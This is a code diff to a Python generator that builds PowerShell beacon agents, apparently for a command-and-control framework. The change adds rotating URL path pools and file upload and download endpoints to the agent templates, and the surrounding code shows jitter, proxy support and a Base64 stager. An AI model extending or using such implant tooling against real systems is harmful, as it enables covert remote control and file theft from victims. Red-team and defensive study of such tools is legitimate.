@@ -20,10 +20,19 @@ def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="
         rotation_id = str(rotation_info.get('current_rotation_id', 0))
         next_rotation = str(rotation_info.get('next_rotation_time', 0))
         rotation_interval = str(rotation_info.get('rotation_interval', 3600))
+        
+        # Extract path pool from rotation info
+        path_pool = rotation_info.get('current_paths', {}).get('path_pool', [])
+        if path_pool:
+            path_pool_str = "'" + "', '".join(path_pool) + "'"
+            path_pool_code = f"$global:pathPool = @({path_pool_str})"
+        else:
+            path_pool_code = "$global:pathPool = @()"
     else:
         rotation_id = "0"
         next_rotation = str(int(time.time()) + 3600)
         rotation_interval = "3600"
+        path_pool_code = "$global:pathPool = @()"
     
     # Use provided agent config or defaults
     if agent_config is None:
@@ -51,11 +60,17 @@ def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="
     proxy_server = agent_config.get('proxy_server', "")
     proxy_port = agent_config.get('proxy_port', "")
     
+    # Get file operation paths
+    file_upload_path = rotation_info.get('current_paths', {}).get('file_upload_path', '/file_upload') if rotation_info else '/file_upload'
+    file_request_path = rotation_info.get('current_paths', {}).get('file_request_path', '/file_request') if rotation_info else '/file_request'
+    
     # Generate the agent using the templates
     agent_code = generate_from_templates(
         server_address=server_address,
         beacon_path=beacon_path,
         cmd_result_path=cmd_result_path,
+        file_upload_path=file_upload_path,
+        file_request_path=file_request_path,
         rotation_enabled=rotation_enabled,
         rotation_id=rotation_id,
         next_rotation_time=next_rotation,
@@ -72,7 +87,8 @@ def generate_agent_code(server_address, beacon_path="/beacon", cmd_result_path="
         proxy_enabled=proxy_enabled_ps,
         proxy_type=proxy_type,
         proxy_server=proxy_server,
-        proxy_port=proxy_port
+        proxy_port=proxy_port,
+        path_pool_code=path_pool_code  # Add path pool code to template variables
     )
     
     return agent_code
@@ -155,8 +171,19 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
                 rotation_id = rotation_state.get("rotation_counter", 0)
                 next_rotation_time = rotation_state.get("next_rotation_time", next_rotation_time)
                 rotation_interval = rotation_state.get("rotation_interval", rotation_interval)
+                
+                # Get path pool if available
+                path_pool = rotation_state.get("current_paths", {}).get("path_pool", [])
+                if path_pool:
+                    path_pool_str = "'" + "', '".join(path_pool) + "'"
+                    path_pool_code = f"$global:pathPool = @({path_pool_str})"
+                else:
+                    path_pool_code = "$global:pathPool = @()"
         except Exception as e:
             print(f"Warning: Could not load path rotation state: {e}")
+            path_pool_code = "$global:pathPool = @()"
+    else:
+        path_pool_code = "$global:pathPool = @()"
     
     # Convert boolean values to PowerShell format
     random_sleep_enabled = agent_config.get("random_sleep_enabled", False)
@@ -197,7 +224,8 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
         proxy_type=agent_config.get("proxy_type", "system"),
         proxy_server=agent_config.get("proxy_server", ""),
         proxy_port=agent_config.get("proxy_port", ""),
-        url_paths=url_paths
+        url_paths=url_paths,
+        path_pool_code=path_pool_code
     )
         
     # Create the Base64 stager with improved security for first contact
@@ -275,7 +303,7 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
                            beacon_interval, jitter_percentage, max_failures, max_backoff,
                            random_sleep_enabled="$false", max_sleep_time=10, user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                            username="", password="", proxy_enabled="$false", proxy_type="system",
-                           proxy_server="", proxy_port="", url_paths=None, file_upload_path=None, file_request_path=None):
+                           proxy_server="", proxy_port="", url_paths=None, file_upload_path=None, file_request_path=None, path_pool_code="$global:pathPool = @()"):
     """Generate the PowerShell agent code from templates with all options"""
     
     # Get template paths
@@ -333,6 +361,9 @@ def generate_from_templates(server_address, beacon_path, cmd_result_path,
         # Include file upload and request paths
         path_rotation_code = path_rotation_code.replace("{{FILE_UPLOAD_PATH}}", file_upload_path)
         path_rotation_code = path_rotation_code.replace("{{FILE_REQUEST_PATH}}", file_request_path)
+        
+        # Update path pool with the provided path pool code
+        path_rotation_code = path_rotation_code.replace("$global:pathPool = @()", path_pool_code)
     
     # Fill in the agent template with all values
     agent_code = agent_template
